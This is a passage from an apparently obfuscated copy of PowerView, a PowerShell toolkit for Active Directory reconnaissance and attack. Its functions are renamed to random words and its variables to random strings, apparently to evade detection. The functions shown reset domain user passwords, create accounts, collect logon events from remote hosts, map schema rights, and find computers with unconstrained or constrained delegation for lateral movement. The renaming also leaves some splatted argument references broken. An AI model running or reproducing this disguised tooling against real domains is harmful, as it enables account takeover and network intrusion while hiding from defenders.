            $User.Name = $LpgwDvCRKxnE9zi.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $LhnZsdcroBUqwrh
        }
        else {
            $User.DisplayName = $LpgwDvCRKxnE9zi.Identity
        }

        if ($PSBoundParameters['Description']) {
            $User.Description = $bZXZZOdJRlyaKks
        }

        Write-Verbose "[devotional] Attempting to create user '$JbtS9UlqTiGk9qR'"
        try {
            $Null = $User.Save()
            Write-Verbose "[devotional] User '$JbtS9UlqTiGk9qR' successfully created"
            $User
        }
        catch {
            Write-Warning "[devotional] Error creating user '$JbtS9UlqTiGk9qR' : $_"
        }
    }
}


function disembarks {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $MhNmgElNMTxhWpJ,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $m9vHwkXCpN9VeDB,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    $DiFXM9AnKByvDqk = @{ 'Identity' = $MhNmgElNMTxhWpJ }
    if ($PSBoundParameters['Domain']) { $DiFXM9AnKByvDqk['Domain'] = $pkMxgDCVHqOym9m }
    if ($PSBoundParameters['Credential']) { $DiFXM9AnKByvDqk['Credential'] = $szvFVWkPJummdcf }
    $LpgwDvCRKxnE9zi = Gautama @ContextArguments

    if ($LpgwDvCRKxnE9zi) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($LpgwDvCRKxnE9zi.Context, $MhNmgElNMTxhWpJ)

        if ($User) {
            Write-Verbose "[disembarks] Attempting to set the password for user '$MhNmgElNMTxhWpJ'"
            try {
                $mURLqVdHfmgznZs = New-Object System.Management.Automation.PSCredential('a', $m9vHwkXCpN9VeDB)
                $User.SetPassword($mURLqVdHfmgznZs.GetNetworkCredential().Password)

                $Null = $User.Save()
                Write-Verbose "[disembarks] Password for user '$MhNmgElNMTxhWpJ' successfully reset"
            }
            catch {
                Write-Warning "[disembarks] Error setting password for user '$MhNmgElNMTxhWpJ' : $_"
            }
        }
        else {
            Write-Warning "[disembarks] Unable to find user '$MhNmgElNMTxhWpJ'"
        }
    }
}


function municipalities {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $cNTDaoDBIWkDu9I = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $9cjkbHBwllnekPC = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $IIO9lspSsnKG9SG = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $FWkLQHcyB9DTAFr = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $z9O9VmdIvspiCYq = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($9cjkbHBwllnekPC.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($IIO9lspSsnKG9SG.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($9cjkbHBwllnekPC.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($IIO9lspSsnKG9SG.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $9fvWw9NoRUhylN9 = @{
            'FilterXPath' = $z9O9VmdIvspiCYq
            'LogName' = 'Security'
            'MaxEvents' = $FWkLQHcyB9DTAFr
        }
        if ($PSBoundParameters['Credential']) { $9fvWw9NoRUhylN9['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        ForEach ($wlkrajnezbzvml9 in $cNTDaoDBIWkDu9I) {

            $9fvWw9NoRUhylN9['ComputerName'] = $wlkrajnezbzvml9

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $wDpWXLYTGZrAWN9 = $Event.Properties
                Switch ($Event.Id) {

                    4624 {

                        if(-not $wDpWXLYTGZrAWN9[5].Value.EndsWith('$')) {
                            $MCqE9JDSKKFQghW = New-Object PSObject -Property @{
                                ComputerName              = $wlkrajnezbzvml9
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $wDpWXLYTGZrAWN9[0].Value.ToString()
                                SubjectUserName           = $wDpWXLYTGZrAWN9[1].Value
                                SubjectDomainName         = $wDpWXLYTGZrAWN9[2].Value
                                SubjectLogonId            = $wDpWXLYTGZrAWN9[3].Value
                                TargetUserSid             = $wDpWXLYTGZrAWN9[4].Value.ToString()
                                TargetUserName            = $wDpWXLYTGZrAWN9[5].Value
                                TargetDomainName          = $wDpWXLYTGZrAWN9[6].Value
                                TargetLogonId             = $wDpWXLYTGZrAWN9[7].Value
                                LogonType                 = $wDpWXLYTGZrAWN9[8].Value
                                LogonProcessName          = $wDpWXLYTGZrAWN9[9].Value
                                AuthenticationPackageName = $wDpWXLYTGZrAWN9[10].Value
                                WorkstationName           = $wDpWXLYTGZrAWN9[11].Value
                                LogonGuid                 = $wDpWXLYTGZrAWN9[12].Value
                                TransmittedServices       = $wDpWXLYTGZrAWN9[13].Value
                                LmPackageName             = $wDpWXLYTGZrAWN9[14].Value
                                KeyLength                 = $wDpWXLYTGZrAWN9[15].Value
                                ProcessId                 = $wDpWXLYTGZrAWN9[16].Value
                                ProcessName               = $wDpWXLYTGZrAWN9[17].Value
                                IpAddress                 = $wDpWXLYTGZrAWN9[18].Value
                                IpPort                    = $wDpWXLYTGZrAWN9[19].Value
                                ImpersonationLevel        = $wDpWXLYTGZrAWN9[20].Value
                                RestrictedAdminMode       = $wDpWXLYTGZrAWN9[21].Value
                                TargetOutboundUserName    = $wDpWXLYTGZrAWN9[22].Value
                                TargetOutboundDomainName  = $wDpWXLYTGZrAWN9[23].Value
                                VirtualAccount            = $wDpWXLYTGZrAWN9[24].Value
                                TargetLinkedLogonId       = $wDpWXLYTGZrAWN9[25].Value
                                ElevatedToken             = $wDpWXLYTGZrAWN9[26].Value
                            }
                            $MCqE9JDSKKFQghW.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $MCqE9JDSKKFQghW
                        }
                    }


                    4648 {

                        if((-not $wDpWXLYTGZrAWN9[5].Value.EndsWith('$')) -and ($wDpWXLYTGZrAWN9[11].Value -match 'taskhost\.exe')) {
                            $MCqE9JDSKKFQghW = New-Object PSObject -Property @{
                                ComputerName              = $wlkrajnezbzvml9
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $wDpWXLYTGZrAWN9[0].Value.ToString()
                                SubjectUserName   = $wDpWXLYTGZrAWN9[1].Value
                                SubjectDomainName = $wDpWXLYTGZrAWN9[2].Value
                                SubjectLogonId    = $wDpWXLYTGZrAWN9[3].Value
                                LogonGuid         = $wDpWXLYTGZrAWN9[4].Value.ToString()
                                TargetUserName    = $wDpWXLYTGZrAWN9[5].Value
                                TargetDomainName  = $wDpWXLYTGZrAWN9[6].Value
                                TargetLogonGuid   = $wDpWXLYTGZrAWN9[7].Value
                                TargetServerName  = $wDpWXLYTGZrAWN9[8].Value
                                TargetInfo        = $wDpWXLYTGZrAWN9[9].Value
                                ProcessId         = $wDpWXLYTGZrAWN9[10].Value
                                ProcessName       = $wDpWXLYTGZrAWN9[11].Value
                                IpAddress         = $wDpWXLYTGZrAWN9[12].Value
                                IpPort            = $wDpWXLYTGZrAWN9[13].Value
                            }
                            $MCqE9JDSKKFQghW.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $MCqE9JDSKKFQghW
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function inhabitable {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $RYWuPYjyXf9TnJ9 = @{}
    if ($PSBoundParameters['Credential']) { $RYWuPYjyXf9TnJ9['Credential'] = $szvFVWkPJummdcf }

    try {
        $9sAuffe9kXs9tjC = (cannibalizes @ForestArguments).schema.name
    }
    catch {
        throw '[inhabitable] Error in retrieving forest schema path from cannibalizes'
    }
    if (-not $9sAuffe9kXs9tjC) {
        throw '[inhabitable] Error in retrieving forest schema path from cannibalizes'
    }

    $tHAcROQOWB9HdRG = @{
        'SearchBase' = $9sAuffe9kXs9tjC
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
    if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
    if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
    if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
    if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
    $lnYESP99syfAosc = cackles @SearcherArguments

    if ($lnYESP99syfAosc) {
        try {
            $xSLNEIXByfNTAdG = $lnYESP99syfAosc.FindAll()
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[inhabitable] Error disposing of the Results object: $_"
                }
            }
            $lnYESP99syfAosc.dispose()
        }
        catch {
            Write-Verbose "[inhabitable] Error in building GUID map: $_"
        }
    }

    $tHAcROQOWB9HdRG['SearchBase'] = $9sAuffe9kXs9tjC.replace('Schema','Extended-Rights')
    $tHAcROQOWB9HdRG['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $NiNvJFlGzLKEtaF = cackles @SearcherArguments

    if ($NiNvJFlGzLKEtaF) {
        try {
            $xSLNEIXByfNTAdG = $NiNvJFlGzLKEtaF.FindAll()
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[inhabitable] Error disposing of the Results object: $_"
                }
            }
            $NiNvJFlGzLKEtaF.dispose()
        }
        catch {
            Write-Verbose "[inhabitable] Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function eigenvalues {


    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [Switch]
        $Ku9ZmWgd9fLSPTw,

        [Switch]
        $zFvE9yNbYBI99EP,

        [Switch]
        $FUGpJjdyztqfAwS,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $eloJwlA9uqrC9UD,

        [ValidateNotNullOrEmpty()]
        [String]
        $NIr9bUdzpfH9Gni,

        [ValidateNotNullOrEmpty()]
        [String]
        $SmSMWEXMkNVoOuD,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $fY9ETEwlxYkfiAK = [Enum]::GetNames($9HeFXhwjBUWerxx)

        $fY9ETEwlxYkfiAK = $fY9ETEwlxYkfiAK | ForEach-Object {$_; "NOT_$_"}

        modernists -Name UACFilter -vGJOJLQvTfgDgsh $fY9ETEwlxYkfiAK -Type ([array])
    }

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $ZbONlsoGePsVFsn = cackles @SearcherArguments
    }

    PROCESS {

        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            modernists -ZbJIThQB9AMYzGF -ATNpRDJr9isTTXi $PSBoundParameters
        }

        if ($ZbONlsoGePsVFsn) {
            $9pNjjurFRb9jpSJ = ''
            $9QyouHvxMZKCIKN = ''
            $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                if ($isYmprKvwrxUsJW -match '^S-1-') {
                    $9pNjjurFRb9jpSJ += "(objectsid=$isYmprKvwrxUsJW)"
                }
                elseif ($isYmprKvwrxUsJW -match '^CN=') {
                    $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                        $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[eigenvalues] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                        $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                        $ZbONlsoGePsVFsn = cackles @SearcherArguments
                        if (-not $ZbONlsoGePsVFsn) {
                            Write-Warning "[eigenvalues] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                        }
                    }
                }
                elseif ($isYmprKvwrxUsJW.Contains('.')) {
                    $9pNjjurFRb9jpSJ += "(|(name=$isYmprKvwrxUsJW)(dnshostname=$isYmprKvwrxUsJW))"
                }
                elseif ($isYmprKvwrxUsJW -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $bgaRJRRuWyecMST = (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                }
                else {
                    $9pNjjurFRb9jpSJ += "(name=$isYmprKvwrxUsJW)"
                }
            }
            if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[eigenvalues] Searching for computers with for unconstrained delegation'
                $9QyouHvxMZKCIKN += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[eigenvalues] Searching for computers that are trusted to authenticate for other principals'
                $9QyouHvxMZKCIKN += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[eigenvalues] Searching for printers'
                $9QyouHvxMZKCIKN += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[eigenvalues] Searching for computers with SPN: $SPN"
                $9QyouHvxMZKCIKN += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[eigenvalues] Searching for computers with operating system: $eloJwlA9uqrC9UD"
                $9QyouHvxMZKCIKN += "(operatingsystem=$eloJwlA9uqrC9UD)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[eigenvalues] Searching for computers with service pack: $NIr9bUdzpfH9Gni"
                $9QyouHvxMZKCIKN += "(operatingsystemservicepack=$NIr9bUdzpfH9Gni)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[eigenvalues] Searching for computers with site name: $SmSMWEXMkNVoOuD"
                $9QyouHvxMZKCIKN += "(serverreferencebl=$SmSMWEXMkNVoOuD)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[eigenvalues] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
            }

            $BFvLesNO9yqAUdC | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $DlcqcBMAvlNxwiV = $_.Substring(4)
                    $CEKifFqxfnVApbV = [Int]($9HeFXhwjBUWerxx::$DlcqcBMAvlNxwiV)
                    $9QyouHvxMZKCIKN += "(!(userAccountControl:1.2.840.113556.1.4.803:=$CEKifFqxfnVApbV))"
                }
                else {
                    $CEKifFqxfnVApbV = [Int]($9HeFXhwjBUWerxx::$_)
                    $9QyouHvxMZKCIKN += "(userAccountControl:1.2.840.113556.1.4.803:=$CEKifFqxfnVApbV)"
                }
            }

            $ZbONlsoGePsVFsn.filter = "(&(samAccountType=805306369)$9QyouHvxMZKCIKN)"
            Write-Verbose "[eigenvalues] eigenvalues filter string: $($ZbONlsoGePsVFsn.filter)"

            if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $ZbONlsoGePsVFsn.FindOne() }
            else { $xSLNEIXByfNTAdG = $ZbONlsoGePsVFsn.FindAll() }
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -cNTDaoDBIWkDu9I $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {

                        $wlkrajnezbzvml9 = $_
                        $wlkrajnezbzvml9.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $wlkrajnezbzvml9 = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                        $wlkrajnezbzvml9.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $wlkrajnezbzvml9
                }
            }
            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[eigenvalues] Error disposing of the Results object: $_"
                }
            }
            $ZbONlsoGePsVFsn.dispose()
        }
    }
}


function ensnared {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $TTVRDqV9wSVspX9,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Alias('ReturnOne')]
        [Switch]
        $Fdx99xLobbqBPcQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $fY9ETEwlxYkfiAK = [Enum]::GetNames($9HeFXhwjBUWerxx)

        $fY9ETEwlxYkfiAK = $fY9ETEwlxYkfiAK | ForEach-Object {$_; "NOT_$_"}

        modernists -Name UACFilter -vGJOJLQvTfgDgsh $fY9ETEwlxYkfiAK -Type ([array])
    }

    BEGIN {
        $tHAcROQOWB9HdRG = @{}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['Properties']) { $tHAcROQOWB9HdRG['Properties'] = $wDpWXLYTGZrAWN9 }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['SecurityMasks']) { $tHAcROQOWB9HdRG['SecurityMasks'] = $TTVRDqV9wSVspX9 }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
        $AUHhiqKGQerdpLF = cackles @SearcherArguments
    }

    PROCESS {

        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            modernists -ZbJIThQB9AMYzGF -ATNpRDJr9isTTXi $PSBoundParameters
        }
        if ($AUHhiqKGQerdpLF) {
            $9pNjjurFRb9jpSJ = ''
            $9QyouHvxMZKCIKN = ''
            $MhNmgElNMTxhWpJ | Where-Object {$_} | ForEach-Object {
                $isYmprKvwrxUsJW = $_.Replace('(', '\28').Replace(')', '\29')
                if ($isYmprKvwrxUsJW -match '^S-1-') {
                    $9pNjjurFRb9jpSJ += "(objectsid=$isYmprKvwrxUsJW)"
                }
                elseif ($isYmprKvwrxUsJW -match '^(CN|OU|DC)=') {
                    $9pNjjurFRb9jpSJ += "(distinguishedname=$isYmprKvwrxUsJW)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {


                        $bbGfPzUehrfQybT = $isYmprKvwrxUsJW.SubString($isYmprKvwrxUsJW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[ensnared] Extracted domain '$bbGfPzUehrfQybT' from '$isYmprKvwrxUsJW'"
                        $tHAcROQOWB9HdRG['Domain'] = $bbGfPzUehrfQybT
                        $AUHhiqKGQerdpLF = cackles @SearcherArguments
                        if (-not $AUHhiqKGQerdpLF) {
                            Write-Warning "[ensnared] Unable to retrieve domain searcher for '$bbGfPzUehrfQybT'"
                        }
                    }
                }
                elseif ($isYmprKvwrxUsJW -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $bgaRJRRuWyecMST = (([Guid]$isYmprKvwrxUsJW).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $9pNjjurFRb9jpSJ += "(objectguid=$bgaRJRRuWyecMST)"
                }
                elseif ($isYmprKvwrxUsJW.Contains('\')) {
                    $Z9PeoZBl9Cf9jhl = $isYmprKvwrxUsJW.Replace('\28', '(').Replace('\29', ')') | intermediate -nnLLVWbvFttZtjp Canonical
                    if ($Z9PeoZBl9Cf9jhl) {
                        $gdPjJFIs9vhMOqE = $Z9PeoZBl9Cf9jhl.SubString(0, $Z9PeoZBl9Cf9jhl.IndexOf('/'))
                        $fT9WVEyXAx9DPM9 = $isYmprKvwrxUsJW.Split('\')[1]
                        $9pNjjurFRb9jpSJ += "(samAccountName=$fT9WVEyXAx9DPM9)"
                        $tHAcROQOWB9HdRG['Domain'] = $gdPjJFIs9vhMOqE
                        Write-Verbose "[ensnared] Extracted domain '$gdPjJFIs9vhMOqE' from '$isYmprKvwrxUsJW'"
                        $AUHhiqKGQerdpLF = cackles @SearcherArguments
                    }
                }
                elseif ($isYmprKvwrxUsJW.Contains('.')) {
                    $9pNjjurFRb9jpSJ += "(|(samAccountName=$isYmprKvwrxUsJW)(name=$isYmprKvwrxUsJW)(dnshostname=$isYmprKvwrxUsJW))"
                }
                else {
                    $9pNjjurFRb9jpSJ += "(|(samAccountName=$isYmprKvwrxUsJW)(name=$isYmprKvwrxUsJW)(displayname=$isYmprKvwrxUsJW))"
                }
            }
            if ($9pNjjurFRb9jpSJ -and ($9pNjjurFRb9jpSJ.Trim() -ne '') ) {
                $9QyouHvxMZKCIKN += "(|$9pNjjurFRb9jpSJ)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[ensnared] Using additional LDAP filter: $RmrzVOkRggEzAyC"
                $9QyouHvxMZKCIKN += "$RmrzVOkRggEzAyC"
            }


            $BFvLesNO9yqAUdC | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
